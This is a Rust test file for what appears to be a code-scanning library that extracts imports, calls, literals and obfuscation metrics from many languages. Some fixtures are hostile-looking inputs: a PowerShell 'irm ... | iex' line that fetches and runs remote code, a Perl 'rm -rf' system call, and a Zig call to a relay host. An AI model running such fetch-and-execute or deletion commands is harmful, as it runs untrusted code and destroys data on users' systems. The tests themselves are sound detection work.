use super::*;

#[test]
fn function_ratios_use_the_extracted_counts() {
    // These ratios read `functions.total` / `imports.total`, keys nothing
    // emits, so they never fired.
    let source = "import os\nimport sys\n\ndef a():\n    return 'x'\n\ndef b():\n    return 'y'\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("m.py"))
        .open(source.as_bytes());
    let metrics = parsed.metrics();
    assert_eq!(
        metrics.get_key(&metric!("text.imports_to_functions_ratio")),
        Some(1.0)
    );
    assert!(
        metrics
            .get_key(&metric!("text.strings_to_functions_ratio"))
            .is_some()
    );
}

#[test]
fn source_query_match_limit_allows_more_headroom_for_recursive_queries() {
    let cursor = source_query_cursor();
    assert_eq!(cursor.match_limit(), 100_000);
}

#[test]
fn strip_quotes_handles_three_quote_kinds() {
    assert_eq!(strip_quotes("\"hello\""), "hello");
    assert_eq!(strip_quotes("'hello'"), "hello");
    assert_eq!(strip_quotes("`hello`"), "hello");
    assert_eq!(strip_quotes("hello"), "hello");
}

#[test]
fn source_query_output_limit_records_metric() {
    fn javascript_language() -> tree_sitter::Language {
        tree_sitter_javascript::LANGUAGE.into()
    }

    let mut src = String::new();
    for i in 0..(SOURCE_QUERY_OUTPUT_LIMIT + 128) {
        if i > 0 {
            src.push(',');
        }
        src.push_str(&format!("u{i}"));
    }
    src.push_str(";\n");

    let mut parser = tree_sitter::Parser::new();
    parser
        .set_language(&javascript_language())
        .expect("javascript grammar");
    let tree = parser.parse(&src, None).expect("parse generated js");
    let query = Query::new(&javascript_language(), "(identifier) @name").expect("identifier query");
    let result = collect_query(&query, &src, tree.root_node());

    assert_eq!(result.items.len(), SOURCE_QUERY_OUTPUT_LIMIT);
    assert!(result.output_limited);
    let mut metrics = Metrics::new();
    emit_query_limit_metrics(&mut metrics, "identifiers", &result);
    assert_eq!(metrics.get("source.query_limited"), Some(1.0));
    assert_eq!(metrics.get("source.query_limited.identifiers"), Some(1.0));
    assert_eq!(
        metrics.get("source.query_limited.identifiers.output_limit"),
        Some(1.0)
    );
}

fn javascript_tree(src: &str) -> tree_sitter::Tree {
    let mut parser = tree_sitter::Parser::new();
    parser
        .set_language(&tree_sitter_javascript::LANGUAGE.into())
        .expect("javascript grammar");
    parser.parse(src, None).expect("parse generated js")
}

fn javascript_query(kind: QueryKind) -> &'static Query {
    langs::config_for(FileType::JavaScript)
        .and_then(|config| config.query(kind))
        .expect("javascript query")
}

/// Run `collect_query` with the work budget overridden to `polls`.
fn collect_with_work_budget(
    query: &Query,
    src: &str,
    root: Node<'_>,
    polls: u64,
) -> QueryCollection {
    QUERY_WORK_OVERRIDE.set(polls);
    let result = collect_query(query, src, root);
    QUERY_WORK_OVERRIDE.set(0);
    result
}

/// The point of a work budget: a query that runs out stops at the same
/// match every time, however loaded the machine is. Every step inside
/// these nested calls is expensive (each enclosing call holds an open
/// `require` match), the shape the old wall-clock budget cut short at a
/// load-dependent point.
#[test]
fn query_work_budget_stops_at_the_same_point_every_time() {
    let src: String = (0..2_000)
        .map(|i| format!("{}require(\"m{i}\"){};\n", "a(".repeat(50), ")".repeat(50)))
        .collect();
    let tree = javascript_tree(&src);
    let imports = javascript_query(QueryKind::Imports);

    let full = collect_query(imports, &src, tree.root_node());
    assert!(!full.timed_out);
    assert_eq!(full.items.len(), 2_000);
    let first = collect_with_work_budget(imports, &src, tree.root_node(), 20);
    let second = collect_with_work_budget(imports, &src, tree.root_node(), 20);
    assert!(first.timed_out && second.timed_out);
    assert_eq!(first.items, second.items);
    assert!(!first.items.is_empty() && first.items.len() < full.items.len());
}

/// The calibration promise: queries over an ordinary file as large as
/// the query byte range fit in a tenth of the work budget.
#[test]
fn ordinary_large_file_queries_within_a_tenth_of_the_budget() {
    let mut src = String::new();
    let mut i = 0;
    while src.len() < SOURCE_QUERY_BYTE_LIMIT {
        src.push_str(&format!(
                "function a{i}(e,t,n){{var r=n({i}),o=require(\"m{i}\");return e.exports=Object.assign({{}},t,{{x{i}:[1,2,3].map(function(u){{return u*{i}}}),y:\"s{i}\"+t.q}}),o}}\n"
            ));
        i += 1;
    }
    let tree = javascript_tree(&src);
    for kind in [QueryKind::Imports, QueryKind::Functions, QueryKind::Classes] {
        let result = collect_with_work_budget(
            javascript_query(kind),
            &src,
            tree.root_node(),
            SOURCE_QUERY_WORK_BUDGET / 10,
        );
        assert!(
            !result.timed_out,
            "{kind:?} ran out of a tenth of its budget"
        );
    }
}

/// Without the start-depth cap, every step under 10k nested arrow
/// functions revisits an open match per enclosing call: the imports query
/// needs about 4k polls and its cost grows with the square of the depth.
/// With the cap the cursor stops descending past it, so a tenth of that
/// suffices.
#[test]
fn deep_nesting_is_not_walked_past_the_start_depth_cap() {
    let src = format!(
        "x = {}{};\n",
        "((a, b".repeat(10_000),
        ") => 1)".repeat(10_000)
    );
    // Deep trees recurse in tree-sitter's C code; give it a worker stack.
    let result = std::thread::Builder::new()
        .stack_size(64 * 1024 * 1024)
        .spawn(move || {
            let tree = javascript_tree(&src);
            let imports = javascript_query(QueryKind::Imports);
            collect_with_work_budget(imports, &src, tree.root_node(), 400).timed_out
        })
        .expect("spawn query thread")
        .join()
        .expect("deep query must not panic");
    assert!(!result, "the imports query walked past the start-depth cap");
}

/// Python `import os` / `from sys import path` populate the
/// unified [`crate::Symbols`] view with the language name as
/// `source` and a non-zero byte offset.
#[test]
fn python_imports_populate_typed_view() {
    let src = b"import os\nfrom sys import path\nimport hashlib\n";
    // `OpenOptions::path` so fileid classifies as Python via the
    // `.py` extension hint — without it the bytes look like
    // plain text and the source extractor never runs.
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("test.py"))
        .open(src);
    let _ = parsed.values();
    let imports: Vec<(&str, Option<&str>, bool)> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Import)
        .filter_map(|s| match s {
            crate::Symbol::Import {
                name,
                library,
                offset,
                ..
            } => Some((name.as_str(), library.as_deref(), offset.is_some())),
            _ => None,
        })
        .collect();
    assert!(
        !imports.is_empty(),
        "expected python imports to populate typed view"
    );
    let names: std::collections::HashSet<&str> = imports.iter().map(|(n, _, _)| *n).collect();
    assert!(names.contains("os"), "got names {names:?}");
    assert!(names.contains("hashlib"));
    assert!(
        imports
            .iter()
            .any(|(name, lib, _)| *name == "path" && *lib == Some("sys"))
    );
    for (_, _, has_offset) in &imports {
        assert!(*has_offset);
    }
}

#[test]
fn python_from_import_owners_and_aliases_are_preserved() {
    let src = b"from os import path as p\nfrom sys import path as p\nfrom .pkg import path as p\nimport requests as r\nfrom os import system\t as   Run\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("imports.py"))
        .open(src);
    let imports: Vec<_> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Import)
        .filter_map(|s| match s {
            crate::Symbol::Import {
                name,
                library,
                alias,
                ..
            } => Some((name.as_str(), library.as_deref(), alias.as_deref())),
            _ => None,
        })
        .collect();
    for expected in [
        ("path", Some("os"), Some("p")),
        ("path", Some("sys"), Some("p")),
        (".pkg.path", Some(".pkg"), Some("p")),
        ("requests", None, Some("r")),
        ("system", Some("os"), Some("Run")),
    ] {
        assert!(
            imports.contains(&expected),
            "missing {expected:?}: {imports:?}"
        );
    }
}

/// Python relative imports (`from . import requests`) must carry their
/// relative prefix so a local submodule named `requests` is not recorded
/// as an import of the PyPI `requests` library. Absolute imports of the
/// same name stay bare.
#[test]
fn python_relative_import_member_keeps_prefix() {
    let src = b"from . import requests\nfrom .graph import responses\nimport os\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("rel.py"))
        .open(src);
    let _ = parsed.values();
    let names: std::collections::HashSet<String> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Import)
        .filter_map(|s| match s {
            crate::Symbol::Import { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect();
    assert!(
        names.contains(".requests"),
        "relative member should be prefixed, got {names:?}"
    );
    assert!(
        !names.contains("requests"),
        "bare `requests` must not appear for a relative import, got {names:?}"
    );
    assert!(
        names.contains(".graph.responses"),
        "member of `.graph` should be `.graph.responses`, got {names:?}"
    );
    assert!(
        names.contains("os"),
        "absolute import unaffected, got {names:?}"
    );
}

/// Zig's grammar stores field access under `member` and positional call
/// arguments as direct expression children. Both must be projected into
/// the shared symbols view so rules can match `ch.txtFields("...")` and
/// inspect its literal argument without a language-specific escape hatch.
#[test]
fn zig_calls_include_static_targets_members_and_arguments() {
    let src = br#"const ch = @import("channels.zig");
pub fn run() void {
    _ = ch.gateOk("gate");
    if (!ch.gateOk("negated")) return;
    _ = ch.txtFields("relay.example", "out");
    _ = ch.gateOk(true);
}
"#;
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("main.zig"))
        .open(src);
    let _ = parsed.values();

    let calls: Vec<(&str, usize, bool)> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Call)
        .filter_map(|s| match s {
            crate::Symbol::Call {
                target: Some(target),
                args,
                ..
            } => Some((
                target.as_str(),
                args.len(),
                args.iter()
                    .any(|arg| matches!(arg, crate::Arg::Bool { value: true })),
            )),
            _ => None,
        })
        .collect();
    assert!(
        calls
            .iter()
            .any(|(target, argc, _)| *target == "ch.txtFields" && *argc == 2)
            && calls
                .iter()
                .any(|(target, _, has_true)| *target == "ch.gateOk" && *has_true),
        "expected static Zig call target and two arguments, got {calls:?}"
    );

    let members: Vec<&str> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Member)
        .filter_map(|s| match s {
            crate::Symbol::Member { path, .. } => Some(path.as_str()),
            _ => None,
        })
        .collect();
    assert!(
        members.contains(&"ch.txtFields"),
        "expected Zig field chain, got {members:?}"
    );
}

/// Call arguments and the literal tier share one decoder, so a prefixed
/// literal decodes in both; unquoted forms stay out of call arguments.
#[test]
fn prefixed_literals_decode_in_call_arguments_like_literals() {
    let src = br#"run(f"cmd {x}", b"\x41", r"\d", rb"\x42", u"plain")
"#;
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("call.py"))
        .open(src);
    let args: Vec<String> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Call)
        .find_map(|s| match s {
            crate::Symbol::Call {
                target: Some(target),
                args,
                ..
            } if target == "run" => Some(args),
            _ => None,
        })
        .expect("run call")
        .iter()
        .map(|arg| match arg {
            crate::Arg::String { value } => value.clone(),
            other => panic!("expected a string argument, got {other:?}"),
        })
        .collect();
    assert_eq!(args, ["cmd {x}", "A", "\\d", "\\x42", "plain"]);
    let literals: Vec<&str> = parsed.literals().iter().map(|l| l.text.as_str()).collect();
    for arg in &args {
        assert!(
            literals.contains(&arg.as_str()),
            "{arg} not in {literals:?}"
        );
    }

    let perl = b"system(q{rm -rf /tmp/x});\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("run.pl"))
        .open(perl);
    assert!(
        parsed
            .literals()
            .iter()
            .any(|l| l.text == "q{rm -rf /tmp/x}"),
        "unquoted literal keeps its source text in the literal tier"
    );
    assert!(
        !parsed
            .symbols()
            .iter_kind(crate::SymbolKind::Call)
            .any(|s| matches!(
                s,
                crate::Symbol::Call { args, .. }
                    if args.iter().any(|a| matches!(a, crate::Arg::String { .. }))
            )),
        "an unquoted literal is not a decoded string argument"
    );
}

/// The outermost node of a member chain records the whole path and every
/// static prefix, each at its first offset; nested links are not
/// re-resolved, and a dynamic link only hides the paths that depend on it.
#[test]
fn member_chains_record_every_static_prefix_once() {
    let src = b"x.y;\na.b().c[\"d\"].e[k].f;\nx.y.z;\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("m.js"))
        .open(src);
    let members: std::collections::BTreeMap<&str, u64> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Member)
        .filter_map(|s| match s {
            crate::Symbol::Member { path, offset } => Some((path.as_str(), (*offset)?)),
            _ => None,
        })
        .collect();
    let expected = std::collections::BTreeMap::from([
        ("x.y", 0),
        ("x.y.z", 26),
        ("a.b", 5),
        ("a.b.c", 5),
        ("a.b.c.d", 5),
        ("a.b.c.d.e", 5),
    ]);
    assert_eq!(members, expected);
    assert_eq!(parsed.metrics().get("ast.max_member_depth"), Some(5.0));
}

/// A `+` chain is measured once, at the node whose parent is not itself a
/// binary expression; a `+` nested under another operator is not a root.
#[test]
fn concat_chain_is_measured_at_its_outermost_node() {
    let metric = |src: &str| {
        crate::OpenOptions::new()
            .path(std::path::Path::new("c.js"))
            .open(src.as_bytes())
            .metrics()
            .get("ast.max_concat_chain")
    };
    assert_eq!(metric("y = a + b + c + (d + e);\n"), Some(4.0));
    assert_eq!(metric("y = a + b - c;\n"), None);
}

#[test]
fn go_package_name_comes_from_the_syntax_tree() {
    let package = |path: &str, src: &str| {
        let parsed = crate::OpenOptions::new()
            .path(std::path::Path::new(path))
            .open(src.as_bytes());
        parsed
            .source_ast()
            .and_then(|ast| go_package_name(&ast).map(str::to_string))
    };
    assert_eq!(
        package("a.go", "package demo\nfunc main(){}\n").as_deref(),
        Some("demo")
    );
    assert_eq!(package("a.go", "func main(){}\n").as_deref(), Some(""));
    assert_eq!(package("a.py", "package = 1\n"), None);
}

/// Helper: parse `src` as a source file with the given extension
/// and return the import names + (function name, decl) pairs from
/// the unified [`crate::Symbols`] view. Asserts the file classified
/// to a non-text-only source extractor (i.e. `text.*` metrics
/// fired) so callers can focus on language-specific structural facts.
fn parse_source(name: &str, src: &[u8]) -> (Vec<String>, Vec<String>) {
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new(name))
        .open(src);
    let _ = parsed.values();
    let imports: Vec<String> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Import)
        .filter_map(|s| match s {
            crate::Symbol::Import { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect();
    let functions: Vec<String> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Function)
        .filter_map(|s| match s {
            crate::Symbol::Function { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect();
    assert!(
        parsed.metrics().get("text.lines").unwrap_or(0.0) > 0.0,
        "expected text.lines metric to fire for {name}"
    );
    (imports, functions)
}

#[test]
fn ruby_imports_and_definitions() {
    let src = b"require 'json'\nrequire_relative './lib'\nclass Greeter\n  def hello; end\nend\nmodule M; end\n";
    let (imports, functions) = parse_source("app.rb", src);
    assert!(imports.iter().any(|s| s == "json"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"hello"), "expected hello");
    assert!(names.contains(&"Greeter"), "expected Greeter");
    assert!(names.contains(&"M"), "expected M");
}

#[test]
fn lua_imports_and_definitions() {
    let src = b"local M = require(\"socket\")\nfunction greet(name)\n  return name\nend\nlocal function add(a, b) return a + b end\n";
    let (imports, functions) = parse_source("script.lua", src);
    assert!(imports.iter().any(|s| s == "socket"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"greet"), "got {names:?}");
}

#[test]
fn csharp_imports_and_definitions() {
    let src = b"using System;\nusing System.IO;\nnamespace Foo {\n  public class Bar {\n    public void Hello() {}\n  }\n}\n";
    let (imports, functions) = parse_source("App.cs", src);
    assert!(
        imports.iter().any(|s| s == "System" || s == "System.IO"),
        "got {imports:?}"
    );
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"Hello"), "expected Hello");
    assert!(names.contains(&"Bar"), "expected Bar");
}

#[test]
fn c_imports_and_definitions() {
    let src = b"#include <stdio.h>\n#include \"local.h\"\nint add(int a, int b) { return a + b; }\nstruct P { int x; };\n";
    let (imports, functions) = parse_source("main.c", src);
    assert!(!imports.is_empty(), "expected C #include imports");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"add"), "expected add");
    assert!(names.contains(&"P"), "expected P");
}

#[test]
fn scala_imports_and_definitions() {
    let src = b"import scala.collection.mutable\nclass Greeter { def hello() = 1 }\nobject O { def add(a: Int, b: Int) = a + b }\n";
    let (imports, functions) = parse_source("App.scala", src);
    assert!(!imports.is_empty(), "expected scala imports");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"hello"), "expected hello");
    assert!(names.contains(&"Greeter"), "expected Greeter");
}

#[test]
fn objc_imports_and_definitions() {
    let src = b"#import <Foundation/Foundation.h>\n@interface Greeter : NSObject\n- (void)hello;\n@end\n@implementation Greeter\n- (void)hello {}\n@end\n";
    let (imports, _functions) = parse_source("view.m", src);
    assert!(!imports.is_empty(), "expected objc imports");
}

#[test]
fn kotlin_imports_and_definitions() {
    let src = b"package foo\nimport java.io.File\nclass Greeter { fun hello() = 1 }\nfun add(a: Int, b: Int) = a + b\n";
    let (imports, functions) = parse_source("App.kt", src);
    assert!(
        imports.iter().any(|s| s.contains("File")),
        "got {imports:?}"
    );
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"hello"), "got {names:?}");
    assert!(names.contains(&"add"), "got {names:?}");
}

#[test]
fn swift_imports_and_definitions() {
    let src = b"import Foundation\nclass Greeter {\n  func hello() -> Int { return 1 }\n}\nfunc add(a: Int, b: Int) -> Int { return a + b }\n";
    let (imports, functions) = parse_source("app.swift", src);
    assert!(imports.iter().any(|s| s == "Foundation"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"add"), "got {names:?}");
}

#[test]
fn perl_imports_and_definitions() {
    let src = b"use strict;\nuse warnings;\nuse Foo::Bar;\npackage My::Class;\nsub greet { return 1 }\nsub add { my ($a, $b) = @_; return $a + $b }\n";
    let (imports, functions) = parse_source("app.pl", src);
    assert!(imports.iter().any(|s| s == "Foo::Bar"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"greet"), "expected greet");
    assert!(names.contains(&"add"), "expected add");
    assert!(names.contains(&"My::Class"), "expected My::Class");
}

#[test]
fn groovy_imports_and_definitions() {
    let src = b"package com.example\nimport java.util.List\nimport groovy.json.*\nclass Greeter {\n  def hello(name) { return \"hi\" }\n}\n";
    let (imports, functions) = parse_source("App.groovy", src);
    assert!(
        imports.iter().any(|s| s == "java.util.List"),
        "got {imports:?}"
    );
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"Greeter"), "got {names:?}");
}

#[test]
fn zig_imports_and_definitions() {
    let src = b"const std = @import(\"std\");\nfn main() void {\n  std.debug.print(\"hi\\n\", .{});\n}\ntest \"smoke\" { try std.testing.expect(true); }\n";
    let (imports, functions) = parse_source("main.zig", src);
    assert!(imports.iter().any(|s| s == "std"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"main"), "got {names:?}");
}

#[test]
fn elixir_imports_and_definitions() {
    let src = b"defmodule Greeter do\n  alias My.Helper\n  import Logger\n  def hello(name), do: name\nend\n";
    let (imports, functions) = parse_source("app.ex", src);
    assert!(
        imports.iter().any(|s| s == "My.Helper" || s == "Logger"),
        "got {imports:?}"
    );
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(
        names.contains(&"hello") || names.contains(&"Greeter"),
        "got {names:?}"
    );
}

#[test]
fn makefile_targets_and_includes() {
    let src = b"include common.mk\n\nall: build\n\nbuild:\n\t@echo building\n";
    let (imports, functions) = parse_source("Makefile", src);
    assert!(imports.iter().any(|s| s == "common.mk"), "got {imports:?}");
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(
        names.iter().any(|n| *n == "all" || *n == "build"),
        "got {names:?}"
    );
}

#[test]
fn powershell_functions_extracted() {
    let src = b"function Get-Greeting {\n  param([string]$Name)\n  Write-Output \"Hi $Name\"\n}\n";
    let (_imports, functions) = parse_source("script.ps1", src);
    let names: Vec<&str> = functions.iter().map(String::as_str).collect();
    assert!(names.contains(&"Get-Greeting"), "got {names:?}");
}

#[test]
fn powershell_protocolless_url_argument_is_extracted_as_literal() {
    let src = b"irm cdn.jsdelivr.net/gh/19875567137/repo/80-7314 | iex\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("sample.ps1"))
        .open(src);
    assert!(
        parsed
            .literals()
            .iter()
            .any(|literal| literal.text == "cdn.jsdelivr.net/gh/19875567137/repo/80-7314"),
        "protocol-less PowerShell URL argument was not promoted to literals"
    );
}

/// Python `def foo()` / `class Bar:` populate the unified
/// [`crate::Symbols`] view with `decl: "function"` / `"class"`.
#[test]
fn python_functions_and_classes_populate_typed_view() {
    let src = b"def hello():\n    pass\n\nclass Greeter:\n    pass\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("test.py"))
        .open(src);
    let _ = parsed.values();
    let names: Vec<&str> = parsed
        .symbols()
        .iter_kind(crate::SymbolKind::Function)
        .filter_map(|s| match s {
            crate::Symbol::Function { name, .. } => Some(name.as_str()),
            _ => None,
        })
        .collect();
    assert!(names.contains(&"hello"), "expected hello");
    assert!(names.contains(&"Greeter"), "expected Greeter");
}

/// Regression: `walk_node` used to recurse one stack frame per tree
/// level with no bound, so a pathologically deep source file (e.g.
/// thousands of nested parens) overflowed the worker stack and aborted
/// the whole process. The walk must now stop at [`ast_walk::MAX_AST_DEPTH`]
/// and complete, with `ast.max_depth` saturating at the cap.
#[test]
#[ignore = "CPU-saturating: parses a 50k-deep AST on an 8 MiB worker stack (>60s). Run with --ignored."]
fn deeply_nested_source_does_not_overflow_stack() {
    let nesting = (super::ast_walk::MAX_AST_DEPTH as usize) * 3;
    let mut src = String::with_capacity(nesting * 2 + 8);
    src.push_str("x = ");
    src.push_str(&"(".repeat(nesting));
    src.push('1');
    src.push_str(&")".repeat(nesting));
    src.push('\n');

    // Run on a worker-sized stack so the test reflects production limits
    // rather than the test harness's smaller default stack.
    let max_depth = std::thread::Builder::new()
        .stack_size(8 * 1024 * 1024)
        .spawn(move || {
            let parsed = crate::OpenOptions::new()
                .path(std::path::Path::new("deep.js"))
                .open(src.as_bytes());
            parsed.metrics().get("ast.max_depth").unwrap_or(0.0)
        })
        .expect("spawn walker thread")
        .join()
        .expect("deep AST walk must not overflow the stack");

    assert_eq!(
        max_depth,
        f64::from(super::ast_walk::MAX_AST_DEPTH),
        "ast.max_depth should saturate at the recursion cap"
    );
}

/// Parse `src` (as `path`) on a worker-sized stack and return its metrics.
/// The unbounded AST-helper recursions (member / concat / subscript chains)
/// used to recurse one frame — and, for member/subscript, one `String`
/// allocation — per link, overflowing the stack and `abort()`ing the whole
/// process on a chain thousands deep. With the cap in place a chain far
/// past [`ast_walk::MAX_AST_DEPTH`] must complete with `ast.max_depth` and
/// every chain-length metric pinned at the cap, never growing with the
/// input. `join()` returning `Ok` asserts nothing overflowed.
///
/// 8 MiB matches the existing `deeply_nested_source_does_not_overflow_stack`
/// test. We don't probe smaller: well past the cap, tree-sitter's own
/// C-level parse/free recurses with the tree and overflows a 2 MiB stack
/// independently of this crate's walk — a separate layer that the 2 MiB
/// `MAX_AST_FILE_BYTES` cap keeps clear of the 256 MiB production stack.
fn metrics_on_worker_stack(path: &str, src: String) -> crate::output::Metrics {
    let path = path.to_string();
    std::thread::Builder::new()
        .stack_size(8 * 1024 * 1024)
        .spawn(move || {
            let parsed = crate::OpenOptions::new()
                .path(std::path::Path::new(&path))
                .open(src.as_bytes());
            parsed.metrics().clone()
        })
        .expect("spawn walker thread")
        .join()
        .expect("deep chain must not overflow the stack")
}

/// Regression: `static_dotted_chain` recursed one stack frame (plus a
/// `String` allocation) per link of a member chain with no bound, so a
/// pathological `a.a.a.…` thousands deep overflowed the worker stack and
/// aborted the process. It must now cap at `MAX_AST_DEPTH` and complete.
#[test]
#[ignore = "CPU-saturating: parses a 50k-deep AST on an 8 MiB worker stack (>60s). Run with --ignored."]
fn deep_member_chain_does_not_overflow_stack() {
    let chain = "a".to_string() + &".a".repeat(50_000);
    let m = metrics_on_worker_stack("deep.js", format!("x = {chain};\n"));
    assert_eq!(
        m.get("ast.max_depth").unwrap_or(0.0),
        f64::from(super::ast_walk::MAX_AST_DEPTH),
        "max_depth should saturate at the cap"
    );
    assert_eq!(
        m.get("ast.depth_capped").unwrap_or(0.0),
        1.0,
        "a chain past the cap must set ast.depth_capped"
    );
}

/// Regression: `string_concat_chain_length::descend` recursed per `+` link
/// with no bound — a `"a"+"a"+…` chain thousands long overflowed the stack.
#[test]
#[ignore = "CPU-saturating: parses a 50k-deep AST on an 8 MiB worker stack (>60s). Run with --ignored."]
fn deep_concat_chain_does_not_overflow_stack() {
    let chain = "\"a\"".to_string() + &"+\"a\"".repeat(50_000);
    let m = metrics_on_worker_stack("deep.js", format!("x = {chain};\n"));
    assert_eq!(
        m.get("ast.depth_capped").unwrap_or(0.0),
        1.0,
        "a concat chain past the cap must set ast.depth_capped"
    );
    // The chain-length metric is bounded too — it can't exceed the cap.
    let concat = m.get("ast.max_concat_chain").unwrap_or(0.0);
    assert!(
        concat <= f64::from(super::ast_walk::MAX_AST_DEPTH),
        "concat chain length must saturate at the cap, got {concat}"
    );
}

/// Regression: nested string-subscript folding (`obj["a"]["b"]…`) is
/// mutually recursive between `static_dotted_chain` and
/// `try_fold_string_subscript`; both were unbounded.
#[test]
#[ignore = "CPU-saturating: parses a 50k-deep AST on an 8 MiB worker stack (>60s). Run with --ignored."]
fn deep_subscript_chain_does_not_overflow_stack() {
    let chain = "a".to_string() + &"[\"b\"]".repeat(50_000);
    let m = metrics_on_worker_stack("deep.js", format!("x = {chain};\n"));
    assert_eq!(
        m.get("ast.depth_capped").unwrap_or(0.0),
        1.0,
        "a subscript chain past the cap must set ast.depth_capped"
    );
}

/// `ast.op_density.<op>` must equal count / node_count and rise sharply
/// when an operator dominates the tree — the signal that distinguishes an
/// obfuscated `number - number` array from a large benign bundle (which
/// has a high subtraction *count* but a low *density*).
#[test]
fn subtraction_density_reflects_concentration() {
    let body: String = (0..60)
        .map(|i| format!("{}-{}", i + 100, i))
        .collect::<Vec<_>>()
        .join(",");
    let src = format!("var a=[{body}];\n");
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("o.js"))
        .open(src.as_bytes());
    let m = parsed.metrics();
    let sub = m.get("ast.op.sub").unwrap_or(0.0);
    let nodes = m.get("ast.node_count").unwrap_or(0.0);
    let density = m.get("ast.op_density.sub").unwrap_or(0.0);

    assert_eq!(sub, 60.0, "60 subtraction expressions");
    assert!(nodes > 0.0);
    assert!(
        (density - sub / nodes).abs() < 1e-9,
        "density must equal count / node_count"
    );
    assert!(
        density > 0.05,
        "a packed subtraction array is dense, got {density}"
    );
}
